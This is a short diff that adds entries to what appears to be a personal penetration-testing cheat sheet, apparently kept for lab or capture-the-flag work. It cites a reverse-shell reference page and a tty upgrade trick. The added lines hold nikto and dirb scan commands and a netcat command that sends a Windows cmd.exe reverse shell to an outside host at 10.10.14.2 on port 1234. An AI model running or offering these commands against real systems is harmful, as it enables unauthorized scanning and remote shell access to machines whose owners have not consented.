@@ -10,3 +10,9 @@ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 Full tty shell
 SHELL=/bin/bash script -q /dev/null
 ----------------------------------------
+nikto -h <ip>
+--------------------------------------
+dirb http://<host>
+-----------------------
+execute -f nc.exe -a "-e cmd.exe 10.10.14.2 1234"
+--------------------------------------------------
